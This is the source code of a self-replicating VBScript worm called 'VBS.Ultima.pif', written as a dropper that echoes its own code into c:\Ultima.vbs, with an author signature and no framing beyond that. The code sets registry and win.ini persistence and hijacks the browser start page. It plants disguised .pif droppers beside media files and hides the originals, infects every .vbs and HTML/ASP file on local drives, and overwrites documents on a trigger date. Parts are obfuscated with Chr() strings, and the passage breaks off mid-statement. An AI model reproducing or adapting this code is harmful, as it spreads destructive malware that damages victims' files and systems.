echo 'author           : by BR3AK-H3ART  &gt;c:\Ultima.vbs
echo 'AGE              : 17  &gt;&gt;c:\Ultima.vbs
echo 'My Ultima nick   : NemesiS[Dark Lord]  &gt;&gt;c:\Ultima.vbs
echo 'from             : TURKEY   &gt;&gt;c:\Ultima.vbs
echo 'e-mail           : br3ak_h3art@hotmail.com   &gt;&gt;c:\Ultima.vbs
echo 'explanation      : My Small Virus Game. ;) / TXT,LOG,HTM,ASP,DOC,XLS,MP3,WAV,ULtimate icon Pif system,Outlook Mail, _  &gt;&gt;c:\Ultima.vbs
echo 'Search Driver Files Mail Line And send.,Send Mail Computer Files  &gt;&gt;c:\Ultima.vbs
echo 'virus name       : VBS.Ultima.pif - FuLL Mother file  &gt;&gt;c:\Ultima.vbs
echo 'Message          : Computer My World.! And I Hate Go to School , All Computer One Game� YES.! Big Game  &gt;&gt;c:\Ultima.vbs
echo 'new Pif-VBS Viruses Coded by BR3AK-H3ART  &gt;&gt;c:\Ultima.vbs
echo 'My Virus No:38  &gt;&gt;c:\Ultima.vbs
echo '312C41\1
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
Set e = a.GetFile(WScript.ScriptFullName)  &gt;&gt;c:\Ultima.vbs
echo Set b = a.GetSpecialFolder(0)
Set g = CreateObject("WScript.Shell")
Set d = a.GetSpecialFolder(2)
Set HH = CreateObject("WScript.Network")  &gt;&gt;c:\Ultima.vbs
echo l=Chr(13)&amp;Chr(10)
n=Chr(34)
Z=Chr(34)
e.copy(b&amp;"\by-BR3AK-H3ART.vbs")
e.copy(b&amp;"\system.dII")
r "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\system32",b&amp;"\by-BR3AK-H3ART.vbs"  &gt;&gt;c:\Ultima.vbs
echo r "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.hidefiles.50megs.com/"
r "HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\","shell32.dll,-152"    &gt;&gt;c:\Ultima.vbs
echo r "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
r "HKEY_CLASSES_ROOT\.dII\","VBSfile"  &gt;&gt;c:\Ultima.vbs
echo r "HKEY_CLASSES_ROOT\VBSFile\Shell\Edit\Command\",b&amp;"\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII"  &gt;&gt;c:\Ultima.vbs
echo r "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\system",b&amp;"\system.dII"
If A2 = "" Then
A2 = 0
end if  &gt;&gt;c:\Ultima.vbs
echo A3=a.GetBaseName(WScript.ScriptFullName)
if (a.FileExists(d&amp;"\"&amp;A3&amp;".txt-")) then
set A4=a.CreateTextFile(d&amp;"\"&amp;A3)
Set A5=a.OpenTextFile(d&amp;"\"&amp;A3&amp;".txt-")  &gt;&gt;c:\Ultima.vbs
echo A6=A5.readall
A4.Writeline A6
A4.close
g.run(d&amp;"\"&amp;A3)
end if
if (a.FileExists(b&amp;"\uo.zip")) Then
else
g.run("Winzip32.exe  -min -a -r -p "&amp;b&amp;"\uo.zip "&amp;b&amp;"\by-BR3AK-H3ART.vbs") , vbhide  &gt;&gt;c:\Ultima.vbs
echo end if
set A7=a.CreateTextFile(b&amp;"\Win98.ini")
A7.close
set A9=a.OpenTextFile(b&amp;"\win.ini")
B3=Split(A9.ReadAll,vbcrlf)
B1=ubound(B3)  &gt;&gt;c:\Ultima.vbs
echo for B2=0 to ubound(B3)
if B3(B2)="run=" then
B3(B2)="run=C:\WINDOWS\WScript.exe c:\WINDOWS\by-BR3AK-H3ART.vbs"
else
B3(B2)=B3(B2)&amp;" "  &gt;&gt;c:\Ultima.vbs
echo end if
next
set B4=a.OpenTextFile(b&amp;"\Win98.ini",2)
B4.write join(B3,vbcrlf)
B4.close
A9.close
set B5=a.getfile(b&amp;"\Win98.ini")  &gt;&gt;c:\Ultima.vbs
echo B5.copy(b&amp;"\win.ini")
for Neme=1 to 3
if Neme="1" Then
set B6=a.CreateTextFile(b&amp;"\UO.pif")
A1=b&amp;"\Write.exe"
OutOpen=b&amp;"\UO.pif"  &gt;&gt;c:\Ultima.vbs
echo end if
if Neme="2" Then
set B6=a.CreateTextFile(b&amp;"\Tarkan-remix-4.Mp3.pif")
A1="C:\Program Files\Winamp\winamp.exe"
OutOpen=b&amp;"\Tarkan-remix-4.Mp3.pif"  &gt;&gt;c:\Ultima.vbs
echo end if
if Neme="3" Then
set B6=a.CreateTextFile(b&amp;"\Bmp.pif")
A1=b&amp;"\Write.exe"
OutOpen=b&amp;"\Bmp.pif"
end if
r "HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\","shell32.dll,-152"  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("0078627920425233414B2D48334152542020202020202020202020202020202080020000"))
B6.Write(XX("433A5C434F4D4D414E442E434F4D00000000000000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("0000000000000000000000000000000000000000000000000000001000003A5C00000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("0000000000000000000000000000000000000000002F6320636F7079202A2E7069662063"))
B6.Write(XX("3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612E"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("626174003A5C7061696E742E00000100FF19500000070000000000000000000000000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("0000000000000000004D4943524F534F46542050494645580087010000710157494E444F"))
B6.Write(XX("57532033383620332E300005029D0168008002000064003200FFFF0000FFFF0000021012"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("001F000000000000000000000000000000000000002F6320636F7079202A2E7069662063"))
B6.Write(XX("3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612E"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("626174003A5C7061696E742E0057494E444F575320564D4D20342E3000FFFF1B02AC0100"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000"))&amp;A1
B6.Write(XX("003682E65786500000000000000000000000000000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000020000000"))
B6.Write(XX("000000000000000320001000000000000000000000001000000050019000300C800E8030"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("2000A0001000000000000000C08000000000100010001005465726D696E616C000000000"))
B6.Write(XX("0000000000000000000000000000000000000004C756369646120436F6E736F6C6500000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("00000000000000000000000000000000000030000005000190035022C015C00540016000"))
B6.Write(XX("0000100FFFFFFFFFFFFFFFF64001B00C0006F00000000000000000000000000000000000"))  &gt;&gt;c:\Ultima.vbs
echo B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000"))
B6.Write(XX("000000000000000000000000000000000000000000000000000000000000000000000000100"))  &gt;&gt;c:\Ultima.vbs
echo B6.Writeline ""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""
B6.Close
set B7=a.OpenTextFile(b&amp;"\by-BR3AK-H3ART.vbs")  &gt;&gt;c:\Ultima.vbs
echo set A8=a.CreateTextFile(b&amp;"\decode.dll")
A8.close
B8=Split(B7.ReadAll,vbcrlf)
B9=ubound(B8)
for C1=0 to ubound(B8)
if (B9=C1) then  &gt;&gt;c:\Ultima.vbs
echo B8(C1)="echo "&amp;B8(C1)&amp;" "&amp;Chr(62)&amp;Chr(62)&amp;"c:\Ultima.vbs"&amp;l&amp;"echo copy c:\windows\wscript.exe c:\ &gt;c:\Runwin.bat"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "echo Wscript Ultima.vbs &gt;&gt;c:\Runwin.bat"&amp;l&amp;"call c:\Runwin.bat"
else
if (C1="0") then
B8(C1)="echo "&amp;B8(C1)&amp;" "&amp;Chr(62)&amp;"c:\Ultima.vbs"  &gt;&gt;c:\Ultima.vbs
echo else
B8(C1)="echo "&amp;B8(C1)&amp;" "&amp;Chr(62)&amp;Chr(62)&amp;"c:\Ultima.vbs"
end if
end if
next
set C2=a.OpenTextFile(b&amp;"\decode.dll",2)
C2.write join(B8,vbcrlf)  &gt;&gt;c:\Ultima.vbs
echo C2.close
B7.close
set C3=a.OpenTextFile(b&amp;"\decode.dll")
set C4=a.Opentextfile(OutOpen,8,true)
F12=C3.readall  &gt;&gt;c:\Ultima.vbs
echo C4.Write ""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""&amp;l&amp;""
C4.Write F12
C4.close
C3.close
next  &gt;&gt;c:\Ultima.vbs
echo r "HKCU\software\VBS-Ultima-PiF\",Chr(86)&amp;Chr(66)&amp;Chr(83)&amp;Chr(46)&amp;Chr(85)&amp;Chr(108)&amp;Chr(116)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(105)&amp;Chr(109)&amp;Chr(97)&amp;Chr(46)&amp;Chr(112)&amp;Chr(105)&amp;Chr(102)&amp;Chr(32)&amp;Chr(67)&amp;Chr(111)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(100)&amp;Chr(101)&amp;Chr(100)&amp;Chr(32)&amp;Chr(66)&amp;Chr(121)&amp;Chr(32)&amp;Chr(66)&amp;Chr(82)&amp;Chr(51)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(65)&amp;Chr(75)&amp;Chr(45)&amp;Chr(72)&amp;Chr(51)&amp;Chr(65)&amp;Chr(82)&amp;Chr(84)&amp;Chr(32)&amp;Chr(47)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(32)&amp;Chr(77)&amp;Chr(97)&amp;Chr(105)&amp;Chr(108)&amp;Chr(32)&amp;Chr(58)&amp;Chr(32)&amp;Chr(98)&amp;Chr(114)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(51)&amp;Chr(97)&amp;Chr(107)&amp;Chr(95)&amp;Chr(104)&amp;Chr(51)&amp;Chr(97)&amp;Chr(114)&amp;Chr(116)&amp;Chr(64)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(104)&amp;Chr(111)&amp;Chr(116)&amp;Chr(109)&amp;Chr(97)&amp;Chr(105)&amp;Chr(108)&amp;Chr(46)&amp;Chr(99)&amp;Chr(111)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(109)&amp;Chr(32)&amp;Chr(47)&amp;Chr(32)&amp;Chr(70)&amp;Chr(82)&amp;Chr(79)&amp;Chr(77)&amp;Chr(32)&amp;Chr(58)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(32)&amp;Chr(84)&amp;Chr(85)&amp;Chr(82)&amp;Chr(75)&amp;Chr(69)&amp;Chr(89)&amp;Chr(32)&amp;Chr(47)&amp;Chr(32)&amp;Chr(65)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(71)&amp;Chr(69)&amp;Chr(32)&amp;Chr(58)&amp;Chr(32)&amp;Chr(49)&amp;Chr(55)
set D4=a.createtextfile(b&amp;"\html.dII")  &gt;&gt;c:\Ultima.vbs
echo D4.writeline "'VBS.Ultima.pif-HTML.ASP"&amp;l&amp;"'html &amp; htm &amp; asp infected system Coded by BR3AK-H3ART"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "'age:17 / from:TURKEY"&amp;l&amp;"'Mail:br3ak_h3art@hotmail.com"&amp;l&amp;"Set a = CreateObject("&amp;Z&amp;"Scripting.FileSystemObject"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set b = a.GetSpecialFolder(0)"&amp;l&amp;"l=Chr(13)&amp;Chr(10)"&amp;l&amp;"n=Chr(34)"&amp;l&amp;"set bj=a.OpenTextFile(b&amp;"&amp;Z&amp;"\by-BR3AK-H3ART.vbs"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "set bw=a.CreateTextFile(b&amp;"&amp;Z&amp;"\htmickode.txt"&amp;Z&amp;")"&amp;l&amp;"bw.close"&amp;l&amp;"w=Split(bj.ReadAll,vbcrlf)"&amp;l&amp;"bh=ubound(w)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "for bz=0 to ubound(w)"&amp;l&amp;"w(bz)=replace(w(bz),"&amp;Z&amp;""&amp;Z&amp;""&amp;Z&amp;""&amp;Z&amp;",Chr(191)+Chr(42)+Chr(63))"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "w(bz)=replace(w(bz),"&amp;Z&amp;"'"&amp;Z&amp;",Chr(59)+Chr(41))"&amp;l&amp;"w(bz)=replace(w(bz),"&amp;Z&amp;"&amp;"&amp;Z&amp;",Chr(167)+Chr(167))"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "w(bz)=replace(w(bz),"&amp;Z&amp;"&lt;/SCRIPT&gt;"&amp;Z&amp;",Chr(60)&amp;Chr(66)&amp;Chr(82)&amp;Chr(51)&amp;Chr(65)&amp;Chr(75)&amp;Chr(62))"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if (bh=bz) then"&amp;l&amp;"w(bz)=chr(34)+w(bz)+chr(34)"&amp;l&amp;"else"&amp;l&amp;"if (bz="&amp;Z&amp;"0"&amp;Z&amp;") then"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "w(bz)="&amp;Z&amp;"encode="&amp;Z&amp;"&amp;chr(34)+w(bz)+chr(34)&amp;chr(38)&amp;"&amp;Z&amp;"vbcrlf&amp; _"&amp;Z&amp;""&amp;l&amp;"else"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "w(bz)=chr(34)+w(bz)+chr(34)&amp;"&amp;Z&amp;"&amp;vbcrlf&amp; _"&amp;Z&amp;""&amp;l&amp;"end if"&amp;l&amp;"end if"&amp;l&amp;"next"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "set d=a.OpenTextFile(b&amp;"&amp;Z&amp;"\htmickode.txt"&amp;Z&amp;",2)"&amp;l&amp;"d.write join(w,vbcrlf)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "d.close"&amp;l&amp;"scrg()"&amp;l&amp;"sub scrg"&amp;l&amp;"On Error Resume Next"&amp;l&amp;"Dim ax,ba,O"&amp;l&amp;"Set ba = a.Drives"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "For Each ax in ba"&amp;l&amp;"If ax.DriveType = 2 or ax.DriveType=3 Then"&amp;l&amp;"cu(ax.path&amp;"&amp;Z&amp;"\"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "end if"&amp;l&amp;"Next"&amp;l&amp;"scrg = O"&amp;l&amp;"end sub"&amp;l&amp;"sub bb(folderspec)"&amp;l&amp;"On Error Resume Next"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "dim bc,bd,be,U,O"&amp;l&amp;"set bc = a.GetFolder(folderspec)"&amp;l&amp;"set be = bc.Files"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "for each bd in be"&amp;l&amp;"U=a.GetExtensionName(bd.path)"&amp;l&amp;"U=lcase(U)"&amp;l&amp;"O=lcase(bd.name)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if (U="&amp;Z&amp;"html"&amp;Z&amp;") or (U="&amp;Z&amp;"htm"&amp;Z&amp;") or (U="&amp;Z&amp;"asp"&amp;Z&amp;") then"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "set bi=a.OpenTextFile(bd.path)"&amp;l&amp;"bt=Split(bi.ReadAll,vbcrlf)"&amp;l&amp;"if (bt(1)="&amp;Z&amp;"&lt;SCRIPT LANGUAGE=VBScript&gt;"&amp;Z&amp;") then"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "else"&amp;l&amp;"Set bk = a.OpenTextFile(bd.path)"&amp;l&amp;"E01=bk.readall"&amp;l&amp;"set bx=a.OpenTextFile(b&amp;"&amp;Z&amp;"\htmickode.txt"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "ca=bx.readall"&amp;l&amp;"set cb=a.CreateTextFile(bd.path)"&amp;l&amp;"cb.writeline "&amp;Z&amp;"&lt;/SCRIPT&gt;"&amp;Z&amp;"&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "l&amp;"&amp;Z&amp;"&lt;SCRIPT LANGUAGE=VBScript&gt;"&amp;Z&amp;"&amp; _"&amp;l&amp;"l&amp;"&amp;Z&amp;"&lt;!--"&amp;Z&amp;"&amp;l&amp;"&amp;Z&amp;"set a=CreateObject("&amp;Z&amp;"&amp;n&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"Scripting.FileSystemObject"&amp;Z&amp;"&amp;n&amp;"&amp;Z&amp;")"&amp;Z&amp;"&amp;l&amp; _"&amp;l&amp;""&amp;Z&amp;"Set g = CreateObject("&amp;Z&amp;"&amp;n&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"WScript.Shell"&amp;Z&amp;"&amp;n&amp;"&amp;Z&amp;")"&amp;Z&amp;"&amp;l&amp; _"&amp;l&amp;""&amp;Z&amp;"regz "&amp;Z&amp;"&amp;n&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinSys"&amp;Z&amp;"&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "n&amp;"&amp;Z&amp;","&amp;Z&amp;"&amp;n&amp;"&amp;Z&amp;"c:\e-card.vbs"&amp;Z&amp;"&amp;n&amp;l&amp;"&amp;Z&amp;"set vbs=a.createtextfile("&amp;Z&amp;"&amp;n&amp;"&amp;Z&amp;"c:\e-card.vbs"&amp;Z&amp;"&amp;n&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;")"&amp;Z&amp;"&amp;l&amp;ca&amp;l&amp; _"&amp;l&amp;""&amp;Z&amp;"encodez=replace(encode,Chr(191)+Chr(42)+Chr(63),Chr(34))"&amp;Z&amp;"&amp;l&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"encodex=replace(encodez,Chr(59)&amp;Chr(41),chr(39))"&amp;Z&amp;"&amp;l&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"encodes=replace(encodex,Chr(167)&amp;Chr(167),chr(38))"&amp;Z&amp;"&amp;l&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"encodel=replace(encodes,Chr(60)&amp;Chr(66)&amp;Chr(82)&amp;Chr(51)&amp;Chr(65)&amp;Chr(75)"&amp;Z&amp;"&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"&amp;Chr(62),Chr(60)&amp;Chr(47)&amp;Chr(83)&amp;Chr(67)&amp;Chr(82)&amp;Chr(73)&amp;Chr(80)&amp;Chr(84)&amp;Chr(62))"&amp;Z&amp;"&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "l&amp;"&amp;Z&amp;"vbs.write encodel"&amp;Z&amp;"&amp;l&amp;"&amp;Z&amp;"vbs.close"&amp;Z&amp;"&amp;l&amp;"&amp;Z&amp;"sub regz(regkey,regvalue)"&amp;Z&amp;"&amp;l&amp; _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo ""&amp;Z&amp;"g.RegWrite regkey,regvalue"&amp;Z&amp;"&amp;l&amp;"&amp;Z&amp;"end sub"&amp;Z&amp;"&amp;l&amp;"&amp;Z&amp;"//--&gt;"&amp;Z&amp;"&amp;l&amp;"&amp;Z&amp;"&lt;/SCRIPT&gt;"&amp;Z&amp;"&amp;l&amp;E01"&amp;l&amp;"cb.close"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "bx.close"&amp;l&amp;"end if"&amp;l&amp;"end if"&amp;l&amp;"bk.close"&amp;l&amp;"next"&amp;l&amp;"end sub"&amp;l&amp;"sub cu(folderspec)"&amp;l&amp;"On Error Resume Next"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "dim bc,bd,sf"&amp;l&amp;"set bc = a.GetFolder(folderspec)"&amp;l&amp;"set sf = bc.SubFolders"&amp;l&amp;"for each bd in sf"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "bb(bd.path)"&amp;l&amp;"cu(bd.path)"&amp;l&amp;"next"&amp;l&amp;"end sub"
D4.CLOSE
g.run(b&amp;"\html.dII")
scrg()
Function C(JL)  &gt;&gt;c:\Ultima.vbs
echo Execute(Chr(70)&amp;Chr(111)&amp;Chr(114)&amp;Chr(32)&amp;Chr(74)&amp;Chr(73)&amp;Chr(32)&amp;Chr(61)&amp;Chr(32)&amp;Chr(49)&amp;Chr(32)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(84)&amp;Chr(111)&amp;Chr(32)&amp;Chr(76)&amp;Chr(101)&amp;Chr(110)&amp;Chr(40)&amp;Chr(74)&amp;Chr(76)&amp;Chr(41)&amp;Chr(13)&amp;Chr(10)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(74)&amp;Chr(85)&amp;Chr(32)&amp;Chr(61)&amp;Chr(32)&amp;Chr(77)&amp;Chr(105)&amp;Chr(100)&amp;Chr(40)&amp;Chr(74)&amp;Chr(76)&amp;Chr(44)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(32)&amp;Chr(74)&amp;Chr(73)&amp;Chr(44)&amp;Chr(32)&amp;Chr(49)&amp;Chr(41)&amp;Chr(13)&amp;Chr(10)&amp;Chr(73)&amp;Chr(102)&amp;Chr(32)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(65)&amp;Chr(115)&amp;Chr(99)&amp;Chr(40)&amp;Chr(74)&amp;Chr(85)&amp;Chr(41)&amp;Chr(32)&amp;Chr(60)&amp;Chr(62)&amp;Chr(32)&amp;Chr(51)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(52)&amp;Chr(32)&amp;Chr(65)&amp;Chr(110)&amp;Chr(100)&amp;Chr(32)&amp;Chr(65)&amp;Chr(115)&amp;Chr(99)&amp;Chr(40)&amp;Chr(74)&amp;Chr(85)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(41)&amp;Chr(32)&amp;Chr(60)&amp;Chr(62)&amp;Chr(32)&amp;Chr(51)&amp;Chr(53)&amp;Chr(32)&amp;Chr(84)&amp;Chr(104)&amp;Chr(101)&amp;Chr(110)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(13)&amp;Chr(10)&amp;Chr(73)&amp;Chr(102)&amp;Chr(32)&amp;Chr(65)&amp;Chr(115)&amp;Chr(99)&amp;Chr(40)&amp;Chr(74)&amp;Chr(85)&amp;Chr(41)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(32)&amp;Chr(77)&amp;Chr(111)&amp;Chr(100)&amp;Chr(32)&amp;Chr(50)&amp;Chr(32)&amp;Chr(61)&amp;Chr(32)&amp;Chr(48)&amp;Chr(32)&amp;Chr(84)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(104)&amp;Chr(101)&amp;Chr(110)&amp;Chr(13)&amp;Chr(10)&amp;Chr(74)&amp;Chr(85)&amp;Chr(32)&amp;Chr(61)&amp;Chr(32)&amp;Chr(67)&amp;Chr(104)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(114)&amp;Chr(40)&amp;Chr(65)&amp;Chr(115)&amp;Chr(99)&amp;Chr(40)&amp;Chr(74)&amp;Chr(85)&amp;Chr(41)&amp;Chr(32)&amp;Chr(43)&amp;Chr(32)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(49)&amp;Chr(41)&amp;Chr(13)&amp;Chr(10)&amp;Chr(69)&amp;Chr(108)&amp;Chr(115)&amp;Chr(101)&amp;Chr(13)&amp;Chr(10)&amp;Chr(74)&amp;Chr(85)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(32)&amp;Chr(61)&amp;Chr(32)&amp;Chr(67)&amp;Chr(104)&amp;Chr(114)&amp;Chr(40)&amp;Chr(65)&amp;Chr(115)&amp;Chr(99)&amp;Chr(40)&amp;Chr(74)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(85)&amp;Chr(41)&amp;Chr(32)&amp;Chr(45)&amp;Chr(32)&amp;Chr(49)&amp;Chr(41)&amp;Chr(13)&amp;Chr(10)&amp;Chr(69)&amp;Chr(110)&amp;Chr(100)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(32)&amp;Chr(73)&amp;Chr(102)&amp;Chr(13)&amp;Chr(10)&amp;Chr(69)&amp;Chr(110)&amp;Chr(100)&amp;Chr(32)&amp;Chr(73)&amp;Chr(102)&amp;Chr(13)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(10)&amp;Chr(67)&amp;Chr(32)&amp;Chr(61)&amp;Chr(32)&amp;Chr(67)&amp;Chr(32)&amp;Chr(38)&amp;Chr(32)&amp;Chr(74)&amp;Chr(85)&amp;Chr(13)&amp; _  &gt;&gt;c:\Ultima.vbs
echo Chr(10)&amp;Chr(78)&amp;Chr(101)&amp;Chr(120)&amp;Chr(116))
End Function
sub r(regkey,regvalue)
On Error Resume Next
g.RegWrite regkey,regvalue  &gt;&gt;c:\Ultima.vbs
echo end sub
sub scrg
On Error Resume Next
Dim ax,ba,O
Set ba = a.Drives
For Each ax in ba
If ax.DriveType = 2 or ax.DriveType=3 Then  &gt;&gt;c:\Ultima.vbs
echo cu(ax.path&amp;"\")
end if
Next
scrg = O
end sub
sub bb(folderspec)
On Error Resume Next
dim bc,bd,be,U,O
set bc = a.GetFolder(folderspec)  &gt;&gt;c:\Ultima.vbs
echo set be = bc.Files
for each bd in be
U=a.GetExtensionName(bd.path)
U=lcase(U)
O=lcase(bd.name)
if (U="vbs") or (U="vbe")  then  &gt;&gt;c:\Ultima.vbs
echo e.copy(bd.path)
elseif (U="bmp") or (U="jpg") or (U="gif") then
picinf=a.Getfile(b&amp;"\Bmp.pif")
picinf.copy(bd.path&amp;".pif")  &gt;&gt;c:\Ultima.vbs
echo set bu2=a.GetFile(bd.path)
bu2.attributes=bu.attributes + 2
bu2.close
elseif (U="zip") then
zip=a.getfile(b&amp;"\uo.zip")
zip.copy(bd.path)  &gt;&gt;c:\Ultima.vbs
echo elseif (U="mp3") or (U="mp2") or (U="wav") then
Mp3inf=a.Getfile(b&amp;"\Tarkan-remix-4.Mp3.pif")
Mp3inf.copy(bd.path&amp;".pif")
set bu=a.GetFile(bd.path)  &gt;&gt;c:\Ultima.vbs
echo bu.attributes=bu.attributes + 2
bu.close
elseif (U="doc") or (U="xls") then
aatch=bd.path
if month(now) = 9 and day(now) = 20 then  &gt;&gt;c:\Ultima.vbs
echo set BadJokee=a.CreateTextFile(bd.path)
BadJokee.writeline "Norton AntiVirus repair This File. (VBS.Scourge.pif) by BR3AK-H3ART"  &gt;&gt;c:\Ultima.vbs
echo Badjokee.close
end if
end if
if (O="login.cfg") or (O="macros.txt") then
if (O="login.cfg") then
set UO=a.CReateTextFiLe(bd.path)  &gt;&gt;c:\Ultima.vbs
echo UO.Writeline "LoginServer=shard.thealterrealm.com,2593"
UO.Close
else
set UO2=a.CReateTextFiLe(bd.path)  &gt;&gt;c:\Ultima.vbs
echo UO.Writeline C("C!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU/ ")&amp; _
l&amp;C("########")&amp;l&amp;C("S!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _  &gt;&gt;c:\Ultima.vbs
echo l&amp;C("########")&amp;l&amp;C("2!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _
l&amp; C("########")&amp;l&amp;C("@!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _  &gt;&gt;c:\Ultima.vbs
echo l&amp;C("########")&amp;l&amp;C("J!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _
